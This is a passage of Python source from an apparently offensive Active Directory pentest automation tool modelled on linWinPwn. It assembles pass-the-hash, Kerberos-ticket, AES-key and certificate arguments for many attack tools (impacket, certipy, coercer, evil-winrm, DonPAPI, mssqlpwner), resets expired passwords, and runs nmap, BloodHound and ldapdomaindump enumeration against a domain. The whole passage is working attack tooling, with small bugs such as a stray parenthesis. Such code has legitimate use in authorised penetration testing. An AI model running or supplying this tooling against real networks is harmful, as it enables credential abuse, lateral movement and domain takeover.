            auth_string = f"{YELLOW}[i]{NC} Authentication method: {YELLOW}Certificate of $user located at {os.path.realpath(pfxcert)}{NC}"
            hash_bool = True
        else:
            if (len(hash) == 65 and hash[32] == ":") or (len(hash) == 33 and hash[0] == ":") or (len(hash) == 32):
                if ":" not in hash:
                    hash = ":" + hash
                if hash.split(":")[0] == "":
                    hash = "aad3b435b51404eeaad3b435b51404ee" + hash
                argument_ne = f"-d {domain} -u '{user}' -H {hash}"
                argument_imp = f" -hashes {hash} {domain}/'{user}'"
                argument_imp_gp = f" -hashes {hash} {domain}/'{user}'"
                argument_imp_ti = f"-user '{user}' -hashes {hash} -domain {domain}"
                argument_bhd = f"-u '{user}'\\@{domain} --hashes {hash} --auth-method ntlm"
                argument_enum4linux = f"-w {domain} -u '{user}' -H {hash[33:]}"
                argument_adidns = f"-u {domain}\\\\'{user}' -p {hash}"
                argument_ldd = f"-u {domain}\\\\'{user}' -p {hash}"
                argument_smbmap = f"-d {domain} -u '{user}' -p {hash}"
                argument_certi_py = f"{domain}/'{user}' --hashes {hash}"
                argument_certipy = f"-u '{user}'\\@{domain} -hashes {hash}"
                argument_pre2k = f"-d {domain} -u '{user}' -hashes {hash}"
                argument_certsync = f"-d {domain} -u '{user}' -hashes {hash}"
                argument_donpapi = f"-H {hash} -d {domain} -u '{user}'"
                argument_hekatomb = f"-hashes {hash} {domain}/'{user}'"
                argument_silenthd = f"-u {domain}\\\\'{user}' --hashes {hash}"
                argument_windap = f"-d {domain} -u '{user}' --hash {hash}"
                argument_targkerb = f"-d {domain} -u '{user}' -H {hash}"
                argument_p0dalirius = f"-d {domain} -u '{user}' -H {hash[33:]})"
                argument_FindUncom = f"-ad {domain} -au '{user}' -ah {hash}"
                argument_manspider = f"-d {domain} -u '{user}' -H {hash[33:]}"
                argument_coercer = f"-d {domain} -u '{user}' --hashes {hash}"
                argument_aced = f" -hashes {hash} {domain}/'{user}'"
                argument_sccm = f"-d {domain} -u '{user}' -hashes {hash}"
                argument_ldapper = f"-D {domain} -U '{user}' -P {hash}"
                argument_ldeep = f"-d {domain} -u '{user}' -H {hash}"
                argument_bloodyad = f"-d {domain} -u '{user}' -p {hash}"
                argument_adalanche = f"--authmode ntlmpth --username '{user}'\\@{domain} --password {hash}"
                argument_mssqlrelay = f"-u '{user}'\\@{domain} -hashes {hash}"
                argument_pygpoabuse = f" -hashes {hash} {domain}/'{user}'"
                argument_GPOwned = f"-d {domain} -u '{user}' -hashes {hash}"
                argument_privexchange = f"-d {domain} -u '{user}' --hashes {hash}"
                argument_adcheck = f"-d {domain} -u '{user}' -H {hash}"
                argument_evilwinrm = f"-u '{user}' -H {hash[33:]}"
                argument_godap = f"-u '{user}' -d {domain} -H {hash}"
                argument_mssqlpwner = f"-hashes {hash} {domain}/'{user}'"
                argument_soapy = f"--hash {hash[33:]} {domain}/'{user}'"
                auth_string = f"{YELLOW}[i]{NC} Authentication method: {YELLOW}NTLM hash of '{user}'{NC}"
            else:
                print(f"{RED}[i]{NC} Incorrect format of NTLM hash...")
                sys.exit(1)

        pass_bool = False
        kerb_bool = False
        os.environ.pop('KRB5CCNAME', None)  # Unset KRB5CCNAME
        aeskey_bool = False

    # Check if kerberos ticket is used
    if kerb_bool:
        argument_ne = f"-d {domain} -u '{user}' --use-kcache"
        pass_bool = False
        hash_bool = False
        aeskey_bool = False
        cert_bool = False
        forcekerb_bool = False
        if os.path.isfile(krb5cc):
            target = dc_FQDN
            target_dc = dc_hostname_list
            target_sql = sql_hostname_list
            target_servers = servers_hostname_list
            krb5cc_path = os.path.realpath(krb5cc)
            os.environ['KRB5CCNAME'] = krb5cc_path
            argument_imp = f"-k -no-pass {domain}/'{user}'"
            argument_enum4linux = f"-w {domain} -u '{user}' -K {krb5cc}"
            argument_bhd = f"-u '{user}'\\@{domain} -k -no-pass -p '' --auth-method kerberos"
            argument_certi_py = f"{domain}/'{user}' -k --no-pass"
            argument_certipy = f"-u '{user}'\\@{domain} -k -no-pass -target {dc_FQDN}"
            argument_ldeep = f"-d {domain} -u '{user}' -k"
            argument_pre2k = f"-d {domain} -u '{user}' -k -no-pass"
            argument_certsync = f"-d {domain} -u '{user}' -use-kcache -no-pass -k"
            argument_donpapi = f"-k --no-pass -d {domain} -u '{user}'"
            argument_targkerb = f"-d {domain} -u '{user}' -k --no-pass"
            argument_p0dalirius = f"-d {domain} -u '{user}' -k --no-pass"
            argument_FindUncom = f"-ad {domain} -au '{user}' -k --no-pass"
            argument_bloodyad = f"-d {domain} -u '{user}' -k"
            argument_adalanche = f"--authmode kerberoscache --username '{user}'\\@{domain}"
            argument_aced = f"-k -no-pass {domain}/'{user}'"
            argument_sccm = f"-d {domain} -u '{user}' -k -no-pass"
            argument_mssqlrelay = f"-u '{user}'\\@{domain} -k -no-pass -target {target}"
            argument_pygpoabuse = f"{domain}/'{user}' -k -ccache {os.path.realpath(krb5cc)}"
            argument_GPOwned = f"-d {domain} -u '{user}' -k -no-pass"
            argument_evilwinrm = f"-r {domain} -u '{user}'"
            argument_godap = f"-d {domain} -k -t ldap/{target}"
            argument_mssqlpwner = f" -k -no-pass {domain}/'{user}'"
            auth_string = f"{YELLOW}[i]{NC} Authentication method: {YELLOW}Kerberos Ticket of $user located at {os.path.realpath(krb5cc)}{NC}"
        else:
            print(f"{RED}[i]{NC} Error accessing provided Kerberos ticket {os.path.realpath(krb5cc)}...")
            sys.exit(1)

    # Check if kerberos AES key is used
    if aeskey_bool:
        target = dc_FQDN
        target_dc = dc_hostname_list
        target_sql = sql_hostname_list
        target_servers = servers_hostname_list
        argument_ne = f"-d {domain} -u '{user}' --aesKey {aeskey}"
        argument_imp = f"-aesKey {aeskey} {domain}/'{user}'"
        argument_bhd = f"-u '{user}'\\@{domain} -aesKey {aeskey} --auth-method kerberos"
        argument_certi_py = f"{domain}/'{user}' --aes {aeskey} -k"
        argument_certipy = f"-u '{user}'\\@{domain} -aes {aeskey} -target {dc_FQDN}"
        argument_pre2k = f"-d {domain} -u '{user}' -aes {aeskey} -k"
        argument_certsync = f"-d {domain} -u '{user}' -aesKey {aeskey} -k"
        argument_donpapi = f"-k --aesKey {aeskey} -d {domain} -u '{user}'"
        argument_targkerb = f"-d {domain} -u '{user}' --aes-key {aeskey} -k"
        argument_p0dalirius = f"-d {domain} -u '{user}' --aes-key {aeskey} -k"
        argument_FindUncom = f"-ad {domain} -au '{user}' --aes-key {aeskey} -k"
        argument_aced = f"-aes {aeskey} {domain}/'{user}'"
        argument_sccm = f"-d {domain} -u '{user}' -aes {aeskey}"
        argument_mssqlrelay = f"-u '{user}'\\@{domain} -aes {aeskey} -k"
        argument_GPOwned = f"-d {domain} -u '{user}' -aesKey {aeskey} -k"
        argument_mssqlpwner = f"{domain}/'{user}' -aesKey {aeskey} -k"
        pass_bool = False
        hash_bool = False
        kerb_bool = False
        os.environ.pop('KRB5CCNAME', None)  # Unset KRB5CCNAME
        cert_bool = False
        forcekerb_bool = False
        auth_string = f"{YELLOW}[i]{NC} Authentication method: {YELLOW}AES Kerberos key of {user}{NC}"

    if forcekerb_bool:
        argument_ne += " -k"
        target = dc_FQDN
        target_dc = dc_hostname_list
        target_sql = sql_hostname_list
        target_servers = servers_hostname_list

    # Perform authentication using provided credentials
    if not nullsess_bool:
        auth_check = run_command(f"{netexec} smb {target} {argument_ne} 2>&1").replace(" Error checking if user is admin on ", "").split('\n', 10)[:10]
        auth_check = '\n'.join(auth_check)
        if "[-]" in auth_check or "Traceback" in auth_check:
            print(auth_check)
            if "STATUS_NOT_SUPPORTED" in auth_check:
                print(f"{BLUE}[*] Domain does not support NTLM authentication. Attempting to generate TGT ticket to use Kerberos instead..{NC}")
                if not impacket_getTGT:
                    print(f"{RED}[-] getTGT.py not found! Please verify the installation of impacket{NC}")
                else:
                    if pass_bool or hash_bool or aeskey_bool:
                        current_dir = os.getcwd()
                        os.chdir(os.path.join(output_dir, "Credentials"))
                        print(f"{CYAN}[*] Requesting TGT for current user{NC}")
                        run_command(f"{impacket_getTGT} {argument_imp} -dc-ip {dc_ip}")
                        os.chdir(current_dir)
                        krb_ticket = os.path.join(output_dir, "Credentials", f"{user}.ccache")
                        if os.path.isfile(krb_ticket):
                            print(f"{GREEN}[+] TGT generated successfully:{NC} '$krb_ticket'")
                            print(f"{GREEN}[+] Re-run linWinPwn to use ticket instead:{NC} linWinPwn.sh -t {dc_ip} -d {domain} -u '{user}' -K '{krb_ticket}'")
                            sys.exit(1)
                        else:
                            print(f"{RED}[-] Failed to generate TGT{NC}")
                    else:
                        print(f"{RED}[-] Error! Requires password, NTLM hash or AES key...{NC}")

            if "STATUS_PASSWORD_MUST_CHANGE" in auth_check or "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT" in auth_check:
                if not impacket_changepasswd:
                    print(f"{RED}[-] changepasswd.py not found! Please verify the installation of impacket{NC}")
                elif kerb_bool or aeskey_bool:
                    print(f"{PURPLE}[-] changepasswd does not support Kerberos authentication{NC}")
                else:
                    pass_passchange = ""
                    if "STATUS_PASSWORD_MUST_CHANGE" in auth_check:
                        print(f"{BLUE}[*] Changing expired password of own user. Please specify new password (default: Summer3000_):{NC}")
                        pass_passchange = input(">> ")
                        if not pass_passchange:
                            pass_passchange = "Summer3000_"
                        print(f"{CYAN}[*] Changing password of {user} to {pass_passchange}{NC}")
                        run_command(f"{impacket_changepasswd} {argument_imp}\\@{dc_ip} -newpass {pass_passchange}")
                    elif "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT" in auth_check:
                        print(f"{BLUE}[*] Changing password of pre created computer account. Please specify new password (default: Summer3000_):{NC}")
                        pass_passchange = input(">> ")
                        if not pass_passchange:
                            pass_passchange = "Summer3000_"
                        authuser_passchange = ""
                        print(f"{BLUE}[*] Please specify username for RPC authentication:{NC}")
                        print(f"{CYAN}[*] Example: user01 {NC}")
                        authuser_passchange = input(">> ")
                        while not authuser_passchange:
                            print(f"{RED}Invalid username.{NC} Please specify username:")
                            authuser_passchange = input(">> ")
                        authpass_passchange = ""
                        print(f"{BLUE}[*] Please specify password for RPC authentication:{NC}")
                        authpass_passchange = input(">> ")
                        while not authpass_passchange:
                            print(f"{RED}Invalid password.{NC} Please specify password:")
                            authpass_passchange = input(">> ")
                        print(f"{CYAN}[*] Changing password of {user} to {pass_passchange}{NC}")
                        run_command(f"{impacket_changepasswd} {argument_imp}\\@{dc_ip} -newpass {pass_passchange} -altuser {authuser_passchange} -altpass {authpass_passchange}")
                    password = pass_passchange
                    auth_check = ""
                    authenticate()
                print("")
            print(f"{RED}[-] Error authenticating to domain! Please check your credentials and try again... {NC}")
            sys.exit(1)

    if verbose_bool:
        ne_verbose = "--verbose"
        argument_imp = f"-debug {argument_imp}"
        argument_imp_gp = f"-debug {argument_imp_gp}"
        argument_imp_ti = f"-debug {argument_imp_ti}"
        argument_enum4linux = f"{argument_enum4linux} -v"
        argument_bhd = f"{argument_bhd} -v"
        argument_adidns = f"{argument_adidns} -v -d"
        argument_pre2k = f"{argument_pre2k} -verbose"
        argument_certsync = f"{argument_certsync} -debug"
        argument_hekatomb = f"-debug {argument_hekatomb}"
        argument_windap = f"{argument_windap} -v --debug"
        argument_targkerb = f"{argument_targkerb} -v"
        argument_kerbrute = "-v"
        argument_manspider = f"{argument_manspider} -v"
        argument_coercer = f"{argument_coercer} -v"
        argument_CVE202233679 = "-debug"
        argument_bloodyad = f"-v DEBUG {argument_bloodyad}"
        argument_aced = f"-debug {argument_aced}"
        argument_sccm = f"-debug {argument_sccm}"
        mssqlrelay_verbose = "-debug"
        adalanche_verbose = "--loglevel Debug"
        argument_pygpoabuse = f"{argument_pygpoabuse} -vv"
        argument_privexchange = f"{argument_privexchange} --debug"
        argument_adcheck = f"{argument_adcheck} --debug"
        argument_mssqlpwner = f"-debug {argument_mssqlpwner}"
        argument_soapy = f"--debug {argument_soapy}"

    print(auth_string)
def parse_servers():
    """
    Parses and consolidates server lists.
    """    
    print(f"{YELLOW}[i]{NC} Parsing server lists...")
    
    def process_server_list(file_pattern: str):
        matching_files = glob.glob(file_pattern)
        if matching_files:
            for file_path in matching_files:
                try:
                    with open(file_path, 'r') as f:
                        content = f.read().replace(' ', '').replace('$', '').upper()
                    with open(file_path, 'w') as f:
                        f.write(content)
                except Exception as e:
                    print(f"Error processing {file_path}: {str(e)}")
        else:
            print(f"No files found matching pattern: {file_pattern}")
    
    # Create directories if they don't exist
    os.makedirs(os.path.dirname(servers_hostname_list), exist_ok=True)
    os.makedirs(os.path.dirname(dc_hostname_list), exist_ok=True)
    os.makedirs(os.path.dirname(servers_ip_list), exist_ok=True)
    os.makedirs(os.path.dirname(dc_ip_list), exist_ok=True)
    
    # Create empty files if they don't exist
    for file_path in [servers_hostname_list, dc_hostname_list, servers_ip_list, dc_ip_list]:
        if not os.path.exists(file_path):
            open(file_path, 'w').close()
    
    # Process server lists if they exist
    process_server_list(f"{output_dir}/DomainRecon/Servers/servers_list_*_{dc_domain}.txt")
    process_server_list(f"{output_dir}/DomainRecon/Servers/dc_list_*_{dc_domain}.txt")

    # Ensure expected output files exist to prevent errors when reading later
    def touch_file(filepath: str):
        if not os.path.exists(filepath):
            try:
                with open(filepath, 'w') as f:
                    pass
            except Exception as e:
                print(f"Error creating {filepath}: {e}")

    required_files = [
        os.path.join(output_dir, "DomainRecon", "enum4linux_active.htb.txt"),
        os.path.join(output_dir, "DomainRecon", "enum4linux_guest_active.htb.txt")
    ]
    for file in required_files:
        touch_file(file)

    def sort_unique_file(in_pattern: str, out_file: str):
        matching_files = glob.glob(in_pattern)
        if matching_files:
            try:
                all_lines = []
                for file_path in matching_files:
                    with open(file_path, 'r') as infile:
                        all_lines.extend(infile.readlines())
                
                unique_lines = sorted(set(all_lines))
                with open(out_file, 'w') as outfile:
                    outfile.writelines(unique_lines)
            except Exception as e:
                print(f"Error sorting/uniquing files: {str(e)}")
        else:
            # Just ensure the output file exists
            if not os.path.exists(out_file):
                open(out_file, 'w').close()
    
    sort_unique_file(f"{output_dir}/DomainRecon/Servers/servers_list_*_{dc_domain}.txt", servers_hostname_list)
    sort_unique_file(f"{output_dir}/DomainRecon/Servers/dc_list_*_{dc_domain}.txt", dc_hostname_list)
    sort_unique_file(f"{output_dir}/DomainRecon/Servers/ip_list_*_{dc_domain}.txt", servers_ip_list)
    sort_unique_file(f"{output_dir}/DomainRecon/Servers/dc_ip_list_*_{dc_domain}.txt", dc_ip_list)

    # Ensure DC information is in the lists
    with open(servers_ip_list, "a+") as f:
        f.seek(0)
        content = f.read()
        if dc_ip not in content:
            f.write(f"{dc_ip}\n")
    
    with open(dc_ip_list, "a+") as f:
        f.seek(0)
        content = f.read()
        if dc_ip not in content:
            f.write(f"{dc_ip}\n")
    
    with open(dc_hostname_list, "a+") as f:
        f.seek(0)
        content = f.read().upper()
        if dc_FQDN.upper() not in content:
            f.write(f"{dc_FQDN.lower()}\n")
    
    with open(servers_hostname_list, "a+") as f:
        f.seek(0)
        content = f.read().upper()
        if dc_FQDN.upper() not in content:
            f.write(f"{dc_FQDN.lower()}\n")

def parse_users():
    global users_list
    users_list = os.path.join(output_dir, "DomainRecon", "Users", f"users_list_{dc_domain}.txt")
    os.makedirs(os.path.dirname(users_list), exist_ok=True)
    if not os.path.exists(users_list):
        open(users_list, 'w').close()
    print(f"{YELLOW}[i]{NC} Parsed users file is ready at: {users_list}")

def dns_enum():
    """
    Performs DNS enumeration using adidnsdump.
    """
    if not adidnsdump:
        print(f"{RED}[-] Please verify the installation of adidnsdump{NC}\n")
    else:
        print(f"{BLUE}[*] DNS dump using adidnsdump{NC}")
        dns_records = os.path.join(output_dir, "DomainRecon", f"dns_records_{dc_domain}.csv")
        if not os.path.isfile(dns_records):
            if kerb_bool or aeskey_bool:
                print(f"{PURPLE}[-] adidnsdump does not support Kerberos authentication{NC}")
            else:
                ldaps_param = "--ssl" if ldaps_bool else ""
                run_command(f"{adidnsdump} {argument_adidns} {ldaps_param} --dns-tcp {dc_ip}")
                try:
                  shutil.move("records.csv", dns_records)
                except:
                  pass
                  
                if os.path.exists(dns_records):
                  with open(dns_records, "r") as f:
                    dns_content = f.read()
                else:
                  dns_content = ''

                # Extract and save server and IP lists
                with open(f"{output_dir}/DomainRecon/Servers/servers_list_dns_{dc_domain}.txt", "w") as f:
                    for line in dns_content.splitlines():
                        if "A," in line and "DnsZones" not in line and "@" not in line:
                            parts = line.split(",")
                            if len(parts) > 2:
                              f.write(f"{parts[1].strip().replace(' ', '')}.{dc_domain}\n")

                with open(f"{output_dir}/DomainRecon/Servers/ip_list_dns_{dc_domain}.txt", "w") as f:
                    for line in dns_content.splitlines():
                        if "A," in line and "DnsZones" not in line and "@" not in line:
                            parts = line.split(",")
                            if len(parts) > 3:
                                f.write(f"{parts[2].strip()}\n")

                with open(f"{output_dir}/DomainRecon/Servers/dc_list_dns_{dc_domain}.txt", "w") as f:
                    for line in dns_content.splitlines():
                        if "@" in line and "NS," in line:
                            parts = line.split(",")
                            if len(parts) > 3:
                                f.write(f"{parts[2].strip().replace('.', '')}\n")

                with open(f"{output_dir}/DomainRecon/Servers/dc_ip_list_dns_{dc_domain}.txt", "w") as f:
                    for line in dns_content.splitlines():
                        if "@" in line and "A," in line:
                            parts = line.split(",")
                            if len(parts) > 3:
                                f.write(f"{parts[2].strip()}\n")

            parse_servers()
        else:
            parse_servers()
            print(f"{YELLOW}[i] DNS dump found {NC}")
    print("")

def smb_scan():
    """
    Performs an SMB scan using nmap to identify open SMB ports.
    """
    if not nmap:
        print(f"{RED}[-] Please verify the installation of nmap {NC}")
        return # changed to return, as there's no point to continue in this func

    if curr_targets == "Domain Controllers":
        servers_smb_list = target_dc
    elif curr_targets == "All domain servers":
        servers_scan_list = target_servers
        print(f"{YELLOW}[i] Scanning all domain servers {NC}")
        servers_smb_list = os.path.join(output_dir, "Scans", f"servers_all_smb_{dc_domain}.txt")
        if not os.path.isfile(servers_smb_list):
            run_command(f"{nmap} -p 445 -Pn -sT -n -iL {servers_scan_list} -oG {output_dir}/Scans/nmap_smb_scan_all_{dc_domain}.txt")
            with open(servers_smb_list, "w") as f:
                process = subprocess.run([f"{nmap} -p 445 -Pn -sT -n -iL {servers_scan_list}"], shell=True, capture_output=True, text=True)
                for line in process.stdout.splitlines():
                   if "open" in line:
                       f.write(line.split(" ")[1]+"\n")
        else:
            print(f"{YELLOW}[i] SMB nmap scan results found {NC}")
    elif curr_targets == "File containing list of servers":
        servers_scan_list = custom_servers_list
        print(f"{YELLOW}[i] Scanning servers in {custom_servers} {NC}")
        servers_smb_list = os.path.join(output_dir, "Scans", f"servers_custom_smb_{dc_domain}.txt")
        if not custom_target_scanned:
            run_command(f"{nmap} -p 445 -Pn -sT -n -iL {servers_scan_list} -oG {output_dir}/Scans/nmap_smb_scan_custom_{dc_domain}.txt")
            with open(servers_smb_list, "w") as f:
                process = subprocess.run([f"{nmap} -p 445 -Pn -sT -n -iL {servers_scan_list}"], shell=True, capture_output=True, text=True)
                for line in process.stdout.splitlines():
                   if "open" in line:
                     f.write(line.split(" ")[1]+"\n")

            custom_target_scanned = True
        else:
            print(f"{YELLOW}[i] SMB nmap scan results found {NC}")
    elif curr_targets == "IP or hostname":
        servers_scan_list = open(custom_servers_list).read().strip()
        print(f"{YELLOW}[i] Scanning server {custom_ip}{NC}")
        servers_smb_list = os.path.join(output_dir, "Scans", f"servers_custom_smb_{dc_domain}.txt")
        if not custom_target_scanned:
            run_command(f"{nmap} -p 445 -Pn -sT -n {servers_scan_list} -oG {output_dir}/Scans/nmap_smb_scan_custom_{dc_domain}.txt")
            with open(servers_smb_list, "w") as f:
                process = subprocess.run([f"{nmap} -p 445 -Pn -sT -n {servers_scan_list}"], shell=True, capture_output=True, text=True)
                for line in process.stdout.splitlines():
                  if "open" in line:
                    f.write(line.split(" ")[1]+"\n")
            custom_target_scanned = True
        else:
            print(f"{YELLOW}[i] SMB nmap scan results found {NC}")
    else:
      print("Error on target selection")
      exit(1)
    return servers_smb_list #Added to return the result

###### ad_enum: AD Enumeration
def bhd_enum():
    if not bloodhound:
        print(f"{RED}[-] Please verify the installation of bloodhound{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "BloodHound"), exist_ok=True)
    print(f"{BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!){NC}")

    if any(f.endswith('.json') for f in os.listdir(os.path.join(output_dir, "DomainRecon", "BloodHound"))):
        print(f"{YELLOW}[i] BloodHound results found, skipping... {NC}")
        return # changed to return, as there's no point to continue

    if nullsess_bool:
        print(f"{PURPLE}[-] BloodHound requires credentials{NC}")
        return # changed to return, as there's no point to continue

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "DomainRecon", "BloodHound"))
    ldapbinding_param = "--ldap-channel-binding" if ldapbinding_bool else ""
    ldaps_param = f"--use-ldaps {ldapbinding_param}" if ldaps_bool else ""
    run_command(f"{bloodhound} -d {dc_domain} {argument_bhd} -c all,LoggedOn -ns {dc_ip} --dns-timeout 5 --dns-tcp -dc {dc_FQDN} {ldaps_param}")
    os.chdir(current_dir)

    #run_command(f"{netexec} {ne_verbose} ldap {ne_kerb} {target} {argument_ne} --bloodhound --dns-server {dc_ip} -c All --log {output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_{dc_domain}.txt")

    # jq parsing commands, using -r for raw output
    subprocess.run(f'jq -r ".data[].Properties.samaccountname| select( . != null )" "{output_dir}"/DomainRecon/BloodHound/*_users.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Users/users_list_bhd_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    subprocess.run(f'jq -r ".data[].Properties.name| select( . != null )" "{output_dir}"/DomainRecon/BloodHound/*_computers.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Servers/servers_list_bhd_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)

    process = subprocess.run(f'jq -r \'.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]\' "{output_dir}"/DomainRecon/BloodHound/*_users.json', shell=True,
                   capture_output=True, text=True, stderr=subprocess.DEVNULL)
    if process.returncode == 0:
        with open(f"{output_dir}/DomainRecon/Servers/sql_list_bhd_{dc_domain}.txt", "w") as f:
            for line in process.stdout.splitlines():
                try:
                    hostname = line.split("/")[1].split(":")[0]
                    f.write(hostname + "\n")  # Only write the hostname part
                except IndexError:
                    pass  # In case the line doesn't match the expected format

    parse_users()
    parse_servers()
    print("")

def bhd_enum_dconly():
    if not bloodhound:
        print(f"{RED}[-] Please verify the installation of bloodhound{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "BloodHound"), exist_ok=True)
    print(f"{BLUE}[*] BloodHound Enumeration using DCOnly{NC}")

    if any(f.endswith('.json') for f in os.listdir(os.path.join(output_dir, "DomainRecon", "BloodHound"))):
        print(f"{YELLOW}[i] BloodHound results found, skipping... {NC}")
        return # changed to return, as there's no point to continue

    if nullsess_bool:
        print(f"{PURPLE}[-] BloodHound requires credentials{NC}")
        return # changed to return, as there's no point to continue

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "DomainRecon", "BloodHound"))
    ldapbinding_param = "--ldap-channel-binding" if ldapbinding_bool else ""
    ldaps_param = f"--use-ldaps {ldapbinding_param}" if ldaps_bool else ""
    run_command(f"{bloodhound} -d {dc_domain} {argument_bhd} -c DCOnly -ns {dc_ip} --dns-timeout 5 --dns-tcp -dc {dc_FQDN} {ldaps_param}")
    os.chdir(current_dir)

    #run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} --bloodhound --dns-server {dc_ip} -c DCOnly --log tee {output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_{dc_domain}.txt")

    # jq parsing commands
    subprocess.run(f'jq -r ".data[].Properties.samaccountname| select( . != null )" "{output_dir}"/DomainRecon/BloodHound/*_users.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Users/users_list_bhd_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    subprocess.run(f'jq -r ".data[].Properties.name| select( . != null )" "{output_dir}"/DomainRecon/BloodHound/*_computers.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Servers/servers_list_bhd_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    parse_users()
    parse_servers()
    print("")


def bhdce_enum():
    if not bloodhoundce:
        print(f"{RED}[-] Please verify the installation of BloodHoundCE{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "BloodHoundCE"), exist_ok=True)
    print(f"{BLUE}[*] BloodHoundCE Enumeration using all collection methods (Noisy!){NC}")

    if any(f.endswith('.json') for f in os.listdir(os.path.join(output_dir, "DomainRecon", "BloodHoundCE"))):
        print(f"{YELLOW}[i] BloodHoundCE results found, skipping... {NC}")
        return # changed to return, as there's no point to continue
    if nullsess_bool:
        print(f"{PURPLE}[-] BloodHoundCE requires credentials{NC}")
        return # changed to return, as there's no point to continue

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "DomainRecon", "BloodHoundCE"))
    run_command(f"{bloodhoundce} -d {dc_domain} {argument_bhd} -c all,LoggedOn -ns {dc_ip} --dns-timeout 5 --dns-tcp -dc {dc_FQDN}")
    os.chdir(current_dir)

    # jq parsing commands
    subprocess.run(f'jq -r ".data[].Properties.samaccountname| select( . != null )" "{output_dir}"/DomainRecon/BloodHoundCE/*_users.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Users/users_list_bhdce_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    subprocess.run(f'jq -r ".data[].Properties.name| select( . != null )" "{output_dir}"/DomainRecon/BloodHoundCE/*_computers.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Servers/servers_list_bhdce_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    
    process = subprocess.run(f'jq -r \'.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]\' "{output_dir}"/DomainRecon/BloodHoundCE/*_users.json', shell=True,
                   capture_output=True, text=True, stderr=subprocess.DEVNULL)
    
    if process.returncode == 0:
        with open(f"{output_dir}/DomainRecon/Servers/sql_list_bhd_{dc_domain}.txt", "w") as f:
            for line in process.stdout.splitlines():
                try:
                    hostname = line.split("/")[1].split(":")[0]
                    f.write(hostname + "\n")  # Only write the hostname part
                except IndexError:
                    pass  # In case the line doesn't match the expected format

    parse_users()
    parse_servers()
    print("")


def bhdce_enum_dconly():
    if not bloodhoundce:
        print(f"{RED}[-] Please verify the installation of BloodHoundCE{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "BloodHoundCE"), exist_ok=True)
    print(f"{BLUE}[*] BloodHoundCE Enumeration using DCOnly{NC}")
    if any(f.endswith('.json') for f in os.listdir(os.path.join(output_dir, "DomainRecon", "BloodHoundCE"))):
        print(f"{YELLOW}[i] BloodHoundCE results found, skipping... {NC}")
        return # changed to return, as there's no point to continue

    if nullsess_bool:
        print(f"{PURPLE}[-] BloodHoundCE requires credentials{NC}")
        return # changed to return, as there's no point to continue

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "DomainRecon", "BloodHoundCE"))
    run_command(f"{bloodhoundce} -d {dc_domain} {argument_bhd} -c DCOnly -ns {dc_ip} --dns-timeout 5 --dns-tcp -dc {dc_FQDN}")
    os.chdir(current_dir)

    # jq parsing commands
    subprocess.run(f'jq -r ".data[].Properties.samaccountname| select( . != null )" "{output_dir}"/DomainRecon/BloodHoundCE/*_users.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Users/users_list_bhdce_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    subprocess.run(f'jq -r ".data[].Properties.name| select( . != null )" "{output_dir}"/DomainRecon/BloodHoundCE/*_computers.json', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Servers/servers_list_bhdce_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    parse_users()
    parse_servers()
    print("")

def ldapdomaindump_enum():
    if not ldapdomaindump:
        print(f"{RED}[-] Please verify the installation of ldapdomaindump{NC}")
        return
    
    os.makedirs(os.path.join(output_dir, "DomainRecon", "LDAPDomainDump"), exist_ok=True)
    print(f"{BLUE}[*] ldapdomaindump Enumeration{NC}")
    
    if any(f.endswith('.json') for f in os.listdir(os.path.join(output_dir, "DomainRecon", "LDAPDomainDump"))):
        print(f"{YELLOW}[i] ldapdomaindump results found, skipping... {NC}")
        return # changed to return, as there's no point to continue

    if kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] ldapdomaindump does not support Kerberos authentication {NC}")
        return  # Skip if Kerberos auth is used

    ldapbinding_param = "--ldap-channel-binding" if ldapbinding_bool else ""
    ldaps_param = f"{ldapbinding_param} ldaps" if ldaps_bool else "ldap"
    run_command(f"{ldapdomaindump} {argument_ldd} {ldaps_param}://{dc_ip} -o {output_dir}/DomainRecon/LDAPDomainDump")

    # jq parsing commands
    subprocess.run(f'jq -r ".[].attributes.sAMAccountName[]" "{output_dir}/DomainRecon/LDAPDomainDump/domain_users.json"', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Users/users_list_ldd_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    subprocess.run(f'jq -r ".[].attributes.dNSHostName[]" "{output_dir}/DomainRecon/LDAPDomainDump/domain_computers.json"', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Servers/servers_list_ldd_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    parse_users()
    parse_servers()
